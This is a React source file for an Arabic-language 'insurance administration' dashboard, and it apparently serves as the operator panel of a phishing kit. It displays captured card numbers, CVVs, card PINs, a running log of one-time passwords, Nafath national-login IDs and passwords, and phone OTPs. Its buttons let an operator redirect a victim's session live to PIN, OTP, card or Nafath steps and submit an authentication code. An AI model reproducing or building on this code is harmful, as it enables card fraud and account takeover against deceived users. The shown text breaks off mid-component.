"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  XCircle,
  Clock,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Flag,
  Trash2,
  Filter,
  FileText,
  Car,
  Shield,
  User,
  ChevronDown,
  Activity,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { CreditCardMockup } from "@/components/credit-card-mockup"

const STEP_NAMES: Record<number | string, string> = {
  1: "PIN",
  2: "تفاصيل",
  3: "OTP",
  4: "بطاقة",
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.6)]" : "bg-muted-foreground/40"}`}
      />
      <span className={`text-xs font-medium ${status === "online" ? "text-emerald-400" : "text-muted-foreground"}`}>
        {status === "online" ? "متصل" : "غير متصل"}
      </span>
    </div>
  )
}

function StatCard({
  icon: Icon,
  label,
  value,
  color,
}: {
  icon: React.ElementType
  label: string
  value: number
  color: "default" | "warning" | "success" | "destructive"
}) {
  const colorClasses = {
    default: "bg-muted text-muted-foreground",
    warning: "bg-warning/10 text-warning",
    success: "bg-success/10 text-success",
    destructive: "bg-destructive/10 text-destructive",
  }

  return (
    <div className="flex items-center gap-4 px-5 py-4 rounded-xl bg-card border border-border/50 hover:border-border transition-colors">
      <div className={`p-2.5 rounded-lg ${colorClasses[color]}`}>
        <Icon className="w-5 h-5" />
      </div>
      <div>
        <p className="text-2xl font-semibold tracking-tight text-foreground">{value}</p>
        <p className="text-xs text-muted-foreground">{label}</p>
      </div>
    </div>
  )
}

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
  const [infoFilter, setInfoFilter] = useState<"all" | "hasInfo" | "noInfo">("all")
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [showChat, setShowChat] = useState(false)
  const [loading, setLoading] = useState(true)
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [showHideFilters, setShowHideFilter] = useState(false)

  const stats = useMemo(() => {
    return {
      total: applications.length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      rejected: applications.filter((a) => a.status === "rejected").length,
    }
  }, [applications])

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((app) => app.status === statusFilter)
      }

      if (cardFilter === "hasCard") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (cardFilter === "noCard") {
        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
      }

      if (infoFilter === "hasInfo") {
        filtered = filtered.filter(
          (app) => !!(app.phoneNumber || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      } else if (infoFilter === "noInfo") {
        filtered = filtered.filter(
          (app) => !(app.nafazId || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.phoneNumber.includes(query),
        )
      }

      setFilteredApplications(filtered)
    }, 300)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])

  const handleStatusChange = async (appId: string, newStatus: string) => {
    try {
      await updateApplication(appId, { currentStep: newStatus as string })
      playErrorSound()
    } catch {}
  }

  const handleStepChange = useCallback(
    async (appId: string, newStep: number) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
      }

      try {
        await updateApplication(appId, { currentStep: newStep })
      } catch (error) {
        console.error("Error updating step:", error)
      }
    },
    [selectedApplication],
  )

  const handleAuthNumber = async (appId: string, auth: string) => {
    try {
      await updateApplication(appId, { authNumber: auth })
    } catch (error) {
      console.error("Error updating step:", error)
    }
  }

  const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
    event.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) {
        newSet.delete(id)
      } else {
        newSet.add(id)
      }
      return newSet
    })
  }, [])

  const isUnread = useCallback((app: InsuranceApplication) => {
    return app.isUnread === true
  }, [])

  const markAsRead = useCallback(async (app: InsuranceApplication) => {
    if (app.isUnread) {
      try {
        await updateApplication(app.id!, { isUnread: false })
        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
      } catch (error) {
        console.error("Error marking as read:", error)
      }
    }
  }, [])

  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, event: React.MouseEvent) => {
    event.stopPropagation()
    try {
      await updateApplication(appId, { isUnread: !currentIsUnread })
      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
    } catch (error) {
      console.error("Error toggling read status:", error)
    }
  }, [])

  const hasCardInfo = useCallback((app: InsuranceApplication) => {
    return !!(app.cardNumber || app.expiryDate || app.cvv)
  }, [])

  const getStatusBadge = useCallback((status: string) => {
    const badges = {
      draft: { text: "مسودة", className: "bg-muted text-muted-foreground" },
      pending_review: {
        text: "قيد المراجعة",
        className: "bg-warning/15 text-warning border-warning/30",
      },
      approved: {
        text: "موافق عليه",
        className: "bg-success/15 text-success border-success/30",
      },
      rejected: { text: "مرفوض", className: "bg-destructive/15 text-destructive border-destructive/30" },
      completed: {
        text: "مكتمل",
        className: "bg-primary/15 text-primary border-primary/30",
      },
    }
    return badges[status as keyof typeof badges] || badges.draft
  }, [])

  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffInSeconds < 60) {
      return "منذ لحظات"
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes === 2 ? "دقيقتين" : "دقائق"}`
    } else if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours === 2 ? "ساعتين" : "ساعات"}`
    } else if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days === 2 ? "يومين" : "أيام"}`
    }

    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }, [])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) {
        setSelectedApplication(updated)
      }
    }
  }, [applications, selectedApplication])

  const handlePhoneVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, phoneVerificationStatus: status } : app)),
      )

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
      }

      try {
        await updateApplication(appId, { phoneVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating phone verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleIdVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, idVerificationStatus: status } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
      }

      try {
        await updateApplication(appId, { idVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating ID verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleDelete = useCallback(
    async (appId: string, event: React.MouseEvent) => {
      event.stopPropagation()
      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
        try {
          setApplications((prev) => prev.filter((app) => app.id !== appId))

          if (selectedApplication?.id === appId) {
            setSelectedApplication(null)
          }

          setSelectedIds((prev) => {
            const newSet = new Set(prev)
            newSet.delete(appId)
            return newSet
          })

          playSuccessSound()
        } catch (error) {
          console.error("Error deleting application:", error)
          playErrorSound()
        }
      }
    },
    [selectedApplication],
  )

  const hasDocumentInfo = (app: InsuranceApplication) => {
    return !!(app.documentType || app.serialNumber || app.phoneNumber || app.nafazId || app.country)
  }

  const hasInsuranceInfo = (app: InsuranceApplication) => {
    return !!(app.insuranceType || app.insuranceStartDate || app.repairLocation)
  }

  const hasVehicleInfo = (app: InsuranceApplication) => {
    return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
  }

  const hasAnyGridData = (app: InsuranceApplication) => {
    return (
      hasDocumentInfo(app) ||
      hasInsuranceInfo(app) ||
      hasVehicleInfo(app) ||
      app.cardNumber ||
      app.phoneNumber2 ||
      app.phoneOtp ||
      app.nafazId
    )
  }

  const getStepName = (step: number | string) => {
    return STEP_NAMES[step] || `الخطوة ${step}`
  }

  return (
    <div className="min-h-screen bg-background dark" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-card/80 backdrop-blur-xl border-b border-border">
        <div className="px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-lg bg-primary flex items-center justify-center">
                  <Shield className="w-5 h-5 text-primary-foreground" />
                </div>
                <div>
                  <h1 className="text-lg font-semibold text-foreground">لوحة إدارة التأمين</h1>
                  <p className="text-xs text-muted-foreground">إدارة الطلبات والعملاء</p>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-success/10 border border-success/20">
                <Activity className="w-3.5 h-3.5 text-success" />
                <span className="text-xs font-medium text-success">{stats.pending} في الانتظار</span>
              </div>
              <Button variant="ghost" size="icon" className="rounded-lg">
                <Settings className="w-4 h-4" />
              </Button>
              <div className="w-8 h-8 rounded-lg bg-secondary flex items-center justify-center text-sm font-medium">
                م
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className="border-b border-border bg-card/50">
        <div className="px-6 py-5">
          <div className="grid grid-cols-4 gap-4">
            <StatCard icon={FileText} label="إجمالي الطلبات" value={stats.total} color="default" />
            <StatCard icon={Clock} label="قيد المراجعة" value={stats.pending} color="warning" />
            <StatCard icon={CheckCircle} label="موافق عليه" value={stats.approved} color="success" />
            <StatCard icon={XCircle} label="مرفوض" value={stats.rejected} color="destructive" />
          </div>
        </div>
      </div>

      <div className="flex h-[calc(100vh-180px)]">
        {/* Sidebar */}
        <div className="w-[400px] bg-card border-l border-border flex flex-col">
          {/* Filter Toggle */}
          <div className="p-3 border-b border-border">
            <Button
              onClick={() => setShowHideFilter(!showHideFilters)}
              variant="ghost"
              className="w-full justify-between text-muted-foreground hover:text-foreground"
            >
              <div className="flex items-center gap-2">
                <Filter className="w-4 h-4" />
                <span>الفلاتر والبحث</span>
              </div>
              <ChevronDown className={`w-4 h-4 transition-transform ${showHideFilters ? "rotate-180" : ""}`} />
            </Button>
          </div>

          {/* Filters */}
          {showHideFilters && (
            <div className="p-4 border-b border-border space-y-4 bg-muted/30">
              {/* Search */}
              <div className="relative">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input
                  placeholder="بحث بالاسم أو رقم الهوية..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 bg-background border-border"
                />
              </div>

              {/* Card Filter */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-muted-foreground">معلومات البطاقة</label>
                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant={cardFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("all")}
                    className="text-xs h-8"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={cardFilter === "hasCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("hasCard")}
                    className="text-xs gap-1.5 h-8"
                  >
                    <CreditCard className="w-3 h-3" />
                    لديه
                  </Button>
                  <Button
                    variant={cardFilter === "noCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("noCard")}
                    className="text-xs h-8"
                  >
                    بدون
                  </Button>
                </div>
              </div>

              {/* Info Filter */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-muted-foreground">معلومات إضافية</label>
                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant={infoFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("all")}
                    className="text-xs h-8"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={infoFilter === "hasInfo" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("hasInfo")}
                    className="text-xs gap-1.5 h-8"
                  >
                    <Flag className="w-3 h-3" />
                    مكتمل
                  </Button>
                  <Button
                    variant={infoFilter === "noInfo" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("noInfo")}
                    className="text-xs h-8"
                  >
                    غير مكتمل
                  </Button>
                </div>
              </div>
            </div>
          )}

          {/* Applications List */}
          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-full">
                <div className="text-center space-y-3">
                  <div className="w-10 h-10 border-2 border-muted border-t-primary rounded-full animate-spin mx-auto" />
                  <p className="text-sm text-muted-foreground">جاري التحميل...</p>
                </div>
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full p-8 text-center">
                <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mb-4">
                  <Mail className="w-8 h-8 text-muted-foreground" />
                </div>
                <p className="text-foreground font-medium mb-1">لا توجد طلبات</p>
                <p className="text-sm text-muted-foreground">جرب تغيير الفلاتر</p>
              </div>
            ) : (
              <div>
                {filteredApplications.map((app) => (
                  <div
                    key={app.id}
                    onClick={() => {
                      setSelectedApplication(app)
                      setShowChat(false)
                      markAsRead(app)
                    }}
                    className={`group relative p-4 cursor-pointer border-b border-border/50 transition-all hover:bg-muted/50 ${
                      selectedApplication?.id === app.id
                        ? "bg-primary/5 border-r-2 border-r-primary"
                        : isUnread(app)
                          ? "bg-primary/[0.02]"
                          : ""
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <Checkbox
                        checked={selectedIds.has(app.id!)}
                        onCheckedChange={() => {}}
                        onClick={(e) => toggleSelection(app.id!, e)}
                        className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary"
                      />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-start justify-between gap-2 mb-2">
                          <div className="flex items-center gap-2 min-w-0">
                            <span className="text-lg flex-shrink-0">
                              {app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}
                            </span>
                            <h3 className="font-medium text-foreground truncate">{app.ownerName}</h3>
                            {isUnread(app) && <span className="w-2 h-2 rounded-full bg-primary flex-shrink-0" />}
                          </div>
                          <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={(e) => toggleReadStatus(app.id!, isUnread(app), e)}
                              className="h-7 w-7 text-muted-foreground hover:text-foreground"
                            >
                              <Mail className={`w-3.5 h-3.5 ${isUnread(app) ? "fill-current" : ""}`} />
                            </Button>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={(e) => handleDelete(app.id!, e)}
                              className="h-7 w-7 text-muted-foreground hover:text-destructive"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                        </div>

                        <div className="flex items-center gap-2 mb-2 flex-wrap">
                          <Badge
                            variant="outline"
                            className={getStatusBadge(app.status).className + " text-[10px] px-2 py-0.5"}
                          >
                            {getStatusBadge(app.status).text}
                          </Badge>
                          <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50">
                            {getStepName(app.currentStep)}
                          </Badge>
                          {hasCardInfo(app) && (
                            <Badge
                              variant="outline"
                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20"
                            >
                              <CreditCard className="w-2.5 h-2.5 mr-1" />
                              بطاقة
                            </Badge>
                          )}
                        </div>

                        <div className="flex items-center gap-4 text-xs text-muted-foreground">
                          <span className="flex items-center gap-1.5">
                            <Phone className="w-3 h-3" />
                            {app.phoneNumber}
                          </span>
                          {app.createdAt && (
                            <span className="flex items-center gap-1.5">
                              <Clock className="w-3 h-3" />
                              {formatArabicDate(app.createdAt)}
                            </span>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 bg-background overflow-y-auto">
          {selectedApplication ? (
            showChat ? (
              <div className="h-full">
                <ChatPanel
                  applicationId={selectedApplication.id!}
                  currentUserId="admin-001"
                  currentUserName="المسؤول"
                  currentUserRole="admin"
                  onClose={() => setShowChat(false)}
                />
              </div>
            ) : (
              <div className="h-full flex flex-col">
                <div className="sticky top-0 z-20 bg-card/95 backdrop-blur-xl border-b border-border">
                  <div className="p-6">
                    <div className="flex items-start justify-between mb-4">
                      <div className="flex items-center gap-4">
                        <div className="w-14 h-14 bg-gradient-to-br from-primary to-primary/70 rounded-xl flex items-center justify-center text-primary-foreground text-xl font-bold shadow-lg">
                          {selectedApplication.ownerName?.charAt(0)}
                        </div>
                        <div>
                          <h2 className="text-xl font-bold text-foreground mb-1">{selectedApplication.ownerName}</h2>
                          <div className="flex items-center gap-2">
                            <UserStatus userId={selectedApplication.id!} />
                            <Badge variant="outline" className="text-xs">
                              {getStepName(selectedApplication.currentStep)}
                            </Badge>
                          </div>
                        </div>
                      </div>
                      <Button onClick={() => setShowChat(true)} size="default" className="gap-2">
                        <MessageSquare className="w-4 h-4" />
                        فتح الدردشة
                      </Button>
                    </div>

                    {/* Control Panel - Now part of fixed header */}
                    <div className="grid grid-cols-7 gap-2">
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
                        variant="outline"
                        size="sm"
                        className="h-10"
                        disabled={selectedApplication.currentStep === "nafad"}
                      >
                        نفاذ
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
                        variant="outline"
                        size="sm"
                        className="h-10 hover:bg-success/10 border-success/30"
                        disabled={selectedApplication.currentStep === "phone"}
                      >
                        التحويل للهاتف
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "home")}
                        variant="outline"
                        size="sm"
                        className="h-10 hover:bg-destructive/10 border-destructive/30"
                        disabled={selectedApplication.currentStep === "home"}
                      >
                        الرئيسية
                      </Button>
                      {[1, 2, 3, 4].map((step) => (
                        <Button
                          key={step}
                          onClick={() => handleStepChange(selectedApplication.id!, step)}
                          variant={selectedApplication.currentStep === step ? "default" : "outline"}
                          size="sm"
                          className="h-10"
                        >
                          {STEP_NAMES[step]}
                        </Button>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="flex-1 overflow-y-auto p-6">
                  {hasAnyGridData(selectedApplication) ? (
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
                      {/* 1. Payment Info - Full width card (most recent data) */}
                      {selectedApplication.cardNumber && (
                        <div
                          className="lg:col-span-2 bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "0ms" }}
                        >
                          <div className="flex items-center gap-3 mb-6">
                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
                              <CreditCard className="w-5 h-5 text-primary" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات الدفع</h3>
                            <Badge
                              variant="destructive"
                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary animate-bounce"
                            >
                              جديد
                            </Badge>
                          </div>
                          <div className="flex flex-col lg:flex-row gap-6">
                            <div className="flex-1">
                              <CreditCardMockup
                                cardNumber={selectedApplication.cardNumber}
                                expiryDate={selectedApplication?.expiryDate}
                                cvv={selectedApplication?.cvv}
                                cardholderName={selectedApplication.ownerName}
                              />
                            </div>
                            <div className="lg:w-64 space-y-4">
                              {selectedApplication.otp && (
                                <div className="p-4 bg-success/10 border border-success/20 rounded-xl animate-in zoom-in duration-300">
                                  <p className="text-xs font-medium text-success mb-2">رمز OTP الحالي</p>
                                  <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
                                    {selectedApplication.otp}
                                  </p>
                                </div>
                              )}
                              
                      {/* 3. Card Verification */}
                      {(selectedApplication.otp || selectedApplication.pinCode) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "200ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-lg bg-success/10 animate-pulse">
                              <CreditCard className="w-5 h-5 text-success" />
                            </div>
                            <h3 className="font-semibold text-foreground">حالة التحقق</h3>
                            <Badge
                              variant="outline"
                              className="mr-auto text-[10px] bg-success/5 border-success/20 text-success"
                            >
                              جديد
                            </Badge>
                          </div>
                          <div className="space-y-4">
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
                                <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
                                <p className="text-lg font-mono font-bold text-foreground">
                                  {selectedApplication.pinCode || "—"}
                                </p>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                                disabled={selectedApplication.idVerificationStatus === "approved"}
                              >
                                <CheckCircle className="w-4 h-4 mr-2" />
                                قبول
                              </Button>
                              <Button
                                onClick={() =>{} }
                                variant="default"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                              >
                                <CheckCircle className="w-4 h-4 mr-2" />
                              Pin
                              </Button>
                              <Button
                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                                disabled={selectedApplication.idVerificationStatus === "rejected"}
                              >
                                <XCircle className="w-4 h-4 mr-2" />
                                رفض
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}
                              {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                                <div className="p-4 bg-muted/50 rounded-xl">
                                  <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
                                  <div className="flex flex-wrap gap-2">
                                    {selectedApplication.allOtps.map((otp, index) => (
                                      <Badge
                                        key={index}
                                        variant="secondary"
                                        className="font-mono animate-in fade-in duration-300"
                                        style={{ animationDelay: `${index * 50}ms` }}
                                        dir="ltr"
                                      >
                                        {otp}
                                      </Badge>
                                    ))}
                                  </div>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      )}

                      {/* 2. Phone Verification */}
                      {(selectedApplication.phoneNumber2 ||
                        selectedApplication.phoneOtp ||
                        selectedApplication.selectedCarrier) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "100ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
                              <Phone className="w-5 h-5 text-primary" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات الهاتف</h3>
                            <Badge
                              variant="outline"
                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary"
                            >
                              جديد
                            </Badge>
                          </div>
                          <div className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
                                <p className="text-xs text-muted-foreground mb-1">الهاتف</p>
                                <p className="text-sm font-mono text-foreground">
                                  {selectedApplication.phoneNumber2 || "—"}
                                </p>
                              </div>
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
                                <p className="text-xs text-muted-foreground mb-1">مزود الخدمة</p>
                                <p className="text-sm font-medium text-foreground">
                                  {selectedApplication.selectedCarrier || "—"}
                                </p>
                              </div>
                            </div>
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-3">
                                  <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
                                    <Phone className="w-5 h-5 text-primary" />
                                  </div>
                                  <div>
                                    <p className="text-sm font-medium text-foreground">رمز الهاتف</p>
                                    <p className="text-lg font-mono font-bold text-primary">
                                      {selectedApplication?.phoneOtp || "—"}
                                    </p>
                                  </div>
                                </div>
                                <Badge
                                  variant={
                                    selectedApplication.phoneVerificationStatus === "approved"
                                      ? "default"
                                      : selectedApplication.phoneVerificationStatus === "rejected"
                                        ? "destructive"
                                        : "secondary"
                                  }
                                  className="animate-in zoom-in duration-300"
                                >
                                  {selectedApplication.phoneVerificationStatus === "approved"
                                    ? "موافق"
                                    : selectedApplication.phoneVerificationStatus === "rejected"
                                      ? "مرفوض"
                                      : "معلق"}
                                </Badge>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                                disabled={selectedApplication.phoneVerificationStatus === "approved"}
                              >
                                <CheckCircle className="w-4 h-4 mr-2" />
                                قبول
                              </Button>
                              <Button
                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                                disabled={selectedApplication.phoneVerificationStatus === "rejected"}
                              >
                                <XCircle className="w-4 h-4 mr-2" />
                                رفض
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}


                      {/* 4. Nafaz */}
                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "300ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2.5 rounded-lg bg-warning/10">
                              <User className="w-5 h-5 text-warning" />
                            </div>
                            <h3 className="font-semibold text-foreground">نفاذ الوطني</h3>
                          </div>
                          <div className="space-y-4">
                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
                              <div className="space-y-3">
                                <div>
                                  <p className="text-xs text-muted-foreground mb-1">الرقم الوطني</p>
                                  <p className="text-sm font-mono font-medium text-foreground">
                                    {selectedApplication.nafazId || "—"}
                                  </p>
                                </div>
                                <div>
                                  <p className="text-xs text-muted-foreground mb-1">الرقم السري</p>
                                  <p className="text-sm font-mono font-medium text-foreground">
                                    {selectedApplication.nafazPass || "—"}
                                  </p>
                                </div>
                                <div>
                                  <p className="text-xs text-muted-foreground mb-1">رمز التوثيق</p>
                                  <Input
                                    type="tel"
                                    value={authNumber}
                                    onChange={(e) => setAuthNumber(e.target.value)}
                                    placeholder="أدخل رمز التوثيق"
                                    className="h-9 text-sm"
                                  />
                                </div>
                              </div>
                            </div>
                            <div className="flex gap-2">
                              <Button
                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                                variant="outline"
                                size="sm"
